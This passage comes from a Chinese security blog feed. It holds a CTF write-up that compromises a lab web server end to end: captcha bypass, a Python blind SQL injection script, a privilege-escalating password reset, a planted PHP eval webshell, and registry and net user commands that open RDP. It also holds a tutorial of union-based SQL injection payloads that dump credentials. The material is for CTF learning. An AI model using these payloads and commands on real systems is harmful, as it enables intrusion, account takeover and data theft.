class="string">"100.js"</span>, <span class="number">864E5</span>)),</div><div class="line">            !<span class="number">0</span>;</div><div class="line">            <span class="keyword">return</span> ! <span class="number">1</span></div><div class="line">        &#125;;</div></pre></td></tr></table></figure></p>
<p>如果满足<strong>1E6 &lt; a</strong>执行<code>a.set(&quot;urlkey&quot;, &quot;webqwer&quot; [1] + &quot;100.js&quot;, 864E5)</code><br>此处传入三个参数<strong>“urlkey”</strong>，<strong>“e100.js”</strong>,<strong>864ES</strong><br>查看set函数<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">this</span>.set = function(b, d, a, c, e, f) &#123;</div><div class="line">           <span class="keyword">this</span>.del(b);</div><div class="line">           c || (c = <span class="string">"/"</span>);</div><div class="line">           b = b + <span class="string">"="</span> + escape(d);</div><div class="line">           a &amp;&amp; (a = <span class="keyword">new</span> Date((<span class="keyword">new</span> Date).getTime() + <span class="number">1E3</span> * a), b += <span class="string">"; expires="</span> + a.toGMTString());</div><div class="line">           b = b + (c ? <span class="string">";\tpath="</span> + c: <span class="string">""</span>) + (e ? <span class="string">";\tdomain="</span> + e: <span class="string">""</span>);</div><div class="line">           b += f ? <span class="string">";\tsecure"</span>: <span class="string">""</span>;</div><div class="line">           document.cookie = b</div><div class="line">       &#125;;</div></pre></td></tr></table></figure></p>
<p>发现函数应该是传入5个参数，有问题。<br>一个坑，其实三个参数只是提示，并不是可以执行的。<br>urlkey —&gt; url地址访问e100.js    864ES忽略<br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fkkabybwmlj30ej04jmx3.jpg" alt="jsfuck"><br>jsfuck编码，<a href="http://www.bugku.com/tools/jsfuck/#" target="_blank" rel="external">这里</a><br>得到flag</p>
<h2 id="全球某工商CTF-安全系的博客"><a href="#全球某工商CTF-安全系的博客" class="headerlink" title="全球某工商CTF-安全系的博客"></a>全球某工商CTF-安全系的博客</h2><p><a href="http://10.21.13.225/zn" target="_blank" rel="external">戳这里=w=</a></p>
<h3 id="后台-伪验证-sql注入-登录-模板注入攻击-菜刀"><a href="#后台-伪验证-sql注入-登录-模板注入攻击-菜刀" class="headerlink" title="后台 伪验证 sql注入 登录 模板注入攻击 菜刀"></a>后台 伪验证 sql注入 登录 模板注入攻击 菜刀</h3><p>很厉害的一个网页，随便点点没什么发现。<br>右键源码一个个看，没什么发现。<br>上工具<strong>SourceLeakHacker</strong>跑目录</p>
<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fkkbpkw17oj30gq0ag0ts.jpg" alt="跑目录"><br></div><br>先尝试访问<strong>200</strong>（正确返回），没有可用信息<br>再尝试访问<strong>303</strong>（跳转），找到<strong>/admin</strong>跳转至后台登录界面<strong>/admin-sign</strong><br>随意试着登录，有逐层递进四种返回状态：<br>+ <strong>参数不能为空！</strong>：判断参数是否为空<br>+ <strong>验证码不正确！</strong>：判断验证码<br>+ <strong>用户名不存在！</strong>：判断用户名是否存在<br>+ <strong>用户认证失败！</strong>：判断密码是否正确<br>先要解决验证码问题，抓包发现，发送账号密码验证码等信息后会再发一个请求包，来修改验证码图片<br><div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fkkc8whxcrj30dn06ymxl.jpg" alt="验证码包"><br></div>

<p>丢弃这个包，验证码不再发生变化，等于绕过了验证<br>尝试<strong>sql注入</strong><br>在用户名处发现注入点<br><code>admin&#39; and &#39;1&#39;=&#39;1</code> 返回 用户认证失败<br><code>admin&#39; and &#39;1&#39;=&#39;2</code> 返回 用户名不存在<br>ps.关于解码/u 在返回包中有写着charset=UTF-8，在python中<code>urllib.unquote(b)</code>即可<br>boolean型盲注password，给出脚本代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"></div><div class="line">url=<span class="string">"http://10.21.13.225/admin-sign/login"</span></div><div class="line"></div><div class="line">payloads=<span class="string">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM,./;'[]\_@!#$%^&amp;*()-=+~`[];'./"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#判断列</span></div><div class="line">sql_column=<span class="string">"admin' and column is not null--+"</span>  <span class="comment">#替换column  得到 password</span></div><div class="line"><span class="comment">#列出password</span></div><div class="line">sql=<span class="string">"admin'  and  ascii(substring(password,%s,1))=%s-- "</span></div><div class="line"></div><div class="line">cookies = dict(ci_session=<span class="string">'b9de57e065184832d04df4c4aa18242f13e04d89'</span>)</div><div class="line"><span class="comment">#headers = &#123;"Content-Type": "application/x-www-form-urlencoded"&#125;</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(i,x)</span>:</span></div><div class="line">	data=&#123;<span class="string">'username'</span>:sql %(i,x),<span class="string">'password'</span>:<span class="string">'21232f297a57a5a743894a0e4a801fc3'</span>,<span class="string">'verify'</span>:<span class="string">'学商商浙浙商'</span>&#125;</div><div class="line">	response=requests.post(url,cookies=cookies,data=data)</div><div class="line">	<span class="comment">#print response.content</span></div><div class="line">	<span class="keyword">if</span>  response.text.find(<span class="string">'\u8ba4'</span>) != <span class="number">-1</span>:</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span></div><div class="line">	<span class="keyword">else</span> :</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span></div><div class="line"></div><div class="line"></div><div class="line">key=<span class="string">''</span></div><div class="line">print(<span class="string">'start'</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">59</span>):</div><div class="line">	<span class="keyword">print</span> i</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">30</span>,<span class="number">151</span>):</div><div class="line">		<span class="keyword">if</span> exp(i,x)==<span class="number">1</span> :</div><div class="line">			key += chr(x)</div><div class="line">			print(key)</div><div class="line">			<span class="keyword">break</span></div></pre></td></tr></table></figure></p>
<p>得到admin的密码MD5为1c63129ae9db9c60c3e8aa94d3e00495<br>直接登录到后台。<br>发现修改语言里面的东西没有权限。<br>发现有管理员账号<strong>orleven</strong>，<strong>平行越权</strong>修改管理员密码。<br> <strong>平行越权</strong>：设置-修改密码，抓包修改admin为orleven。<br>登录进入中文的编辑语言界面。（如果选英文的需要设置为启动，不然之后菜刀连接不上界面）<br>尝试<strong>模板注入漏洞</strong>，后尾加入<code>&quot;;phpinfo();&quot;</code>闭合前后引号<br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fkke2fr6sjj30v30jhjtq.jpg" alt=""><br>页面变化，说明修改了代码可以执行<br>再加入菜刀php木马<code>&quot;;@eval($_POST[&#39;Cknife&#39;]);&quot;</code><br>连上菜刀</p>
<p><div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fkkecje92vj30ci06oq2v.jpg" alt=""><br></div><br>可以直接在桌面上找到flag<br>或者继续：</p>
<p>切换到菜刀终端模式，开启远程连接3389端口<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">删除注册表</div><div class="line">reg delete <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /f</div><div class="line">添加注册表</div><div class="line">reg add <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</div></pre></td></tr></table></figure></p>
<p>修改密码<code>net user Administrator (复杂的密码)</code><br>打开远程桌面连接，账号administrator 密码<br>桌面上得到flag</p>
]]></content>
      
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WEB-CTF中的SQL注入]]></title>
      <url>/2017/08/29/WEB-CTF%E4%B8%AD%E7%9A%84SQL%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<p>—从零开始的笔记—</p>
<a id="more"></a>
<p>从最最基础的开始=.= start</p>
<h2 id="SQL注入的基本原理"><a href="#SQL注入的基本原理" class="headerlink" title="SQL注入的基本原理"></a>SQL注入的基本原理</h2><p>  你提交的<strong>任何内容</strong>都会被服务器放入sql语句中执行,于是可以构筑自己的sql语句在服务器端执行。<br>  当然以上所说的是在服务器完全没有防御的情况下，通常都不会这么简单，但是原理是相同。</p>
<h2 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h2><ul>
<li>根据注入点(既我们提交内容的位置)情况的不同分为两种：<ul>
<li>字符型注入: 提交的内容<strong>会</strong>在服务端处左右会被加上’‘</li>
<li>数字型注入: 提交的内容<strong>不会</strong>在服务端处加上’‘<br>以上两种注入的区别在于：字符型注入需要用各种方法闭合单引号,屏蔽单引号等，而数字型注入不用，即数字型相对简单。</li>
</ul>
</li>
<li>根据对于注入结果服务端会显示给攻击者与否分两种：<ul>
<li>有回显的sql注入：有显示查询结果或错误信息</li>
<li>sql盲注：没有显示直接结果或错误。但仍然由办法提取信息，sql盲注较为复杂又分为<strong>布尔型盲注</strong>和<strong>时间型盲注入</strong><ul>
<li>布尔型盲注：返回状态只有两种情况，通常为有显示true和无显示false，借此来判断是否成功。</li>
<li>时间型盲注：返回状态没有任何区别，若成功人为制造延迟时间延迟，以此来判断是否成功。<br>此篇会详细介绍有回显的sql注入，sql盲注另开一篇</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="简单的了解数据库的结构"><a href="#简单的了解数据库的结构" class="headerlink" title="简单的了解数据库的结构"></a>简单的了解数据库的结构</h2><p>  数据库 &gt; 表 &gt; 列<br>  数据库中的库名，表名，列名等基本信息会存储在information_schema这个数据库中tables，columns的表内。</p>
<table>
<thead>
<tr>
<th style="text-align:center">%</th>
<th style="text-align:center">数据库</th>
<th style="text-align:center">表</th>
<th style="text-align:center">列 </th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">  英文</td>
<td style="text-align:center">schema</td>
<td style="text-align:center">table</td>
<td style="text-align:center">column</td>
</tr>
<tr>
<td style="text-align:center">  信息库中的列名</td>
<td style="text-align:center">table_schema</td>
<td style="text-align:center">table_name</td>
<td style="text-align:center">column_name</td>
</tr>
</tbody>
</table>
<h2 id="字符型SQL注入的步骤"><a href="#字符型SQL注入的步骤" class="headerlink" title="字符型SQL注入的步骤"></a>字符型SQL注入的步骤</h2><p>  首先sql注入的<strong>核心</strong>就是去探测收集服务器的信息，再<strong>推测判断服务器sql语句</strong>的构成，再加以利用得到自己想要的数据即FLAG。</p>
<p>  以下以<strong>最基础的字符型注入</strong>为例，为了方便理解，服务端的sql语句以下为例<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select 列 from 数据库.表 <span class="built_in">where</span> name=<span class="string">'$name'</span></div></pre></td></tr></table></figure></p>
<h3 id="1-判断是否有SQL注入点"><a href="#1-判断是否有SQL注入点" class="headerlink" title="1.判断是否有SQL注入点"></a>1.判断是否有SQL注入点</h3><p>判断sql注入点：服务器会对我们除了正常输入以外的测试语句有反应</p>
<ul>
<li>报错</li>
<li>可以影响到查询结果</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>= 1<span class="string">' and '</span>1<span class="string">' = '</span>1    (前后闭合’‘，此处应该返回正确的页面，即与<span class="variable">$name</span>=1一样)</div><div class="line"></div><div class="line"><span class="variable">$name</span>= 1<span class="string">' and '</span>1<span class="string">' = '</span>2    (前后闭合’‘, 此处应该返回数据库错误的信息，即与<span class="variable">$name</span>=1不同)</div><div class="line"></div><div class="line">全句：select 列 from 表 <span class="built_in">where</span> name = <span class="string">'1'</span> and <span class="string">'1'</span>=<span class="string">'1'</span></div></pre></td></tr></table></figure>
<p>在确认有注入漏洞之后，探测sql语句组成</p>
<h3 id="2-判断select语句中有几列"><a href="#2-判断select语句中有几列" class="headerlink" title="2.判断select语句中有几列"></a>2.判断select语句中有几列</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>=1<span class="string">' order by 数字n --+  （--+ 为url编码后的 --(空格) 是注释符，用于屏蔽后面的‘）</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全句：select 列 from 表 where name = '</span><span class="string">' order by 数字n -- ’</span></div></pre></td></tr></table></figure>
<blockquote>
<p><a href="http://www.w3school.com.cn/sql/sql_orderby.asp" target="_blank" rel="external">order by</a> 列名  （列名可以为select语句中列的序号,name,age——-&gt;1,2）</p>
</blockquote>
<p>因此数字从大往小猜，如果超出它的列数，则报错；如果恰好等于列数，显示$name=1的结果</p>
<p>假设结果 n=2 列</p>
<h3 id="3-判断显示的信息是第几列的信息"><a href="#3-判断显示的信息是第几列的信息" class="headerlink" title="3.判断显示的信息是第几列的信息"></a>3.判断显示的信息是第几列的信息</h3><p>一般在我们可见页面中显示的信息不一定是查询全部列数，可能查询3列，显示1列。<br>通过‘直接闭合前面的select语句，使其前半句查询结果空(除非存在name=’‘的情况)<br>union select 1,2 通过显示的数字来确定显示的列的位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$name=&apos; union select 1,2 --+</div><div class="line"></div><div class="line">全句：select n列 from 表 where name = &apos;&apos; union select 1,2 -- &apos;</div></pre></td></tr></table></figure></p>
<p>假设得到 2 ，以后想要查询的信息就放在第二个列处</p>
<h3 id="4-利用函数来收集信息"><a href="#4-利用函数来收集信息" class="headerlink" title="4.利用函数来收集信息"></a>4.利用函数来收集信息</h3><p>查询sql自带的函数来确定当前用户，当前数据库等信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">用户：user()</div><div class="line">当前数据库：database()</div><div class="line">数据库版本：version()</div><div class="line">@@hostname （用户）</div><div class="line">@@datadir   (数据库在文件的位置)</div><div class="line">@@version  （版本)</div><div class="line">@@version_compile_OS  (操作系统版本)</div><div class="line"></div><div class="line"><span class="variable">$name</span>=<span class="string">' union select 1,user() --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全局：select 2列 from 表 where name = '</span><span class="string">' union select 1,user() -- '</span></div></pre></td></tr></table></figure></p>
<p>如果为root用户，就可以访问information_schema数据库</p>
<h3 id="5-通过-union-查询数据库"><a href="#5-通过-union-查询数据库" class="headerlink" title="5.通过 union 查询数据库"></a>5.通过 union 查询数据库</h3><p>  通过<strong>information_schema数据库</strong>中的tables，columns来查询目标的数据库，表，列<br>  再直接查询内容<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">查询数据库</div><div class="line"><span class="variable">$name</span>=<span class="string">' union select 1,table_schema from information_schema.tables --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">查询数据库中有多少个表</span></div><div class="line"><span class="string">$name='</span> union select table_schema,count(*) from information_schema.tables --+</div><div class="line"></div><div class="line">查询指定数据库中的表名</div><div class="line"><span class="variable">$name</span>=<span class="string">' union select 1,table_name from information_schema.tables where table_schema='</span>dvwa<span class="string">' --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">查询指定数据库指定表中的列名</span></div><div class="line"><span class="string">$name='</span> union select table_name,column_name from information_schema.columns <span class="built_in">where</span> table_schema=<span class="string">'dvwa'</span> and table_name=<span class="string">'users'</span>--+</div><div class="line"></div><div class="line">查询指定数据库指定表的列的内容</div><div class="line"><span class="variable">$name</span>=<span class="string">' union select user,password from dvwa.users --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">查询链接显示</span></div><div class="line"><span class="string">$name='</span> union select null,concat_ws(<span class="string">' : '</span>,user,password) from dvwa.users --(空格)</div><div class="line"><span class="variable">$name</span>=<span class="string">' union select null,concat(user,'</span> : <span class="string">',password) from dvwa.users --(空格)</span></div><div class="line"><span class="string">ps. '</span>:<span class="string">' 编码---&gt; 0x3a</span></div></pre></td></tr></table></figure></p>
<h3 id="6-无权限时，猜解列名，表名，库名"><a href="#6-无权限时，猜解列名，表名，库名" class="headerlink" title="6.无权限时，猜解列名，表名，库名"></a>6.无权限时，猜解列名，表名，库名</h3><p>  当前用户不是root用户，就无权访问information_schema库<br>  只能通过返回页面的两种状态判断是否猜解正确，其原理跟布尔型sql盲注一致<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1.猜解当前表中的列名</div><div class="line"><span class="variable">$name</span>=<span class="string">' and column is null --+    </span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全句：select 2列 from 表 where name = '</span><span class="string">' and column is null -- '</span></div></pre></td></tr></table></figure></p>
<p>用字典文件替换column，如果不存在此列，有错误；存在此列，无返回(类似来判断，下同)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">2.猜解当前表名------已猜出列名</div><div class="line"><span class="variable">$name</span>=<span class="string">' and table.user is null --+	</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">3.猜解当前数据库名--已猜出列名，表名</span></div><div class="line"><span class="string">$name='</span> and db.table.user is null --+</div><div class="line"></div><div class="line">4.猜解当前数据库的其他表</div><div class="line"><span class="variable">$name</span>=<span class="string">' and (select count(*) from table)&gt;0 --+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</span></div></pre></td></tr></table></figure></p>
<p>在猜解到你所要的库，表，列之后可以直接union select 查询</p>
<h2 id="数字型SQL注入"><a href="#数字型SQL注入" class="headerlink" title="数字型SQL注入"></a>数字型SQL注入</h2><p>数字型注入和字符型注入原理相同，但更为简单。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>=1 and 1=1 <span class="comment">#</span></div></pre></td></tr></table></figure></p>
<p>区别：</p>
<ul>
<li>不用考虑 ’ 闭合问题</li>
<li>输入字符’a’时  把需要的字符串变为Ox16进制 </li>
</ul>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>以上就可以通过sql注入漏洞，查询到数据库的信息。<br>另外，还可以通过数据库进行—-&gt;sql文件操作<br>但是实际情况下：<br>服务器会过滤限制我们的输入，这就关系到—-&gt;sql过滤<br>服务器不显示查询信息和错误信息，需要—-&gt;<a href="https://lalajun.github.io/2017/09/24/WEB-CTF%E4%B8%AD%E7%9A%84sql%E7%9B%B2%E6%B3%A8/#more" target="_blank" rel="external">sql盲注</a></p>
<h2 id="数据库函数"><a href="#数据库函数" class="headerlink" title="数据库函数"></a>数据库函数</h2><ul>
<li>char（）—-&gt; ASCII码 变为 字符</li>
<li><a href="http://www.bubuko.com/infodetail-455153.html" target="_blank" rel="external">group_cat（) 和 group_concat</a> —–&gt; 用分隔符链接字符串；可以多个结果合并提高效率</li>
<li><a href="http://www.yiibai.com/sql/sql_function_substring_index.html" target="_blank" rel="external">substring_index()</a>  —–&gt; 分割字符串提取自己想要查看的</li>
<li><a href="http://www.w3school.com.cn/sql/sql_func_mid.asp" target="_blank" rel="external">mid(String,n,n)</a>——&gt;截取字符串</li>
<li><a href="https://www.lvtao.net/study_doc/mysql/mysql_function_oct_str.html" target="_blank" rel="external">ord()</a> ——-&gt;字符变为ASCII码， 一个字节字符直接变ASCII，多字节字符相连ASCII<br>ord() <strong>&amp;</strong> 128 或 64 或 32 或 16 或 8 ……1 来判断分割多个字符</li>
<li>and 前面语句<strong>出错</strong>后面语句不执行   </li>
<li>or  前面语句<strong>正确</strong>后面语句不执行</li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
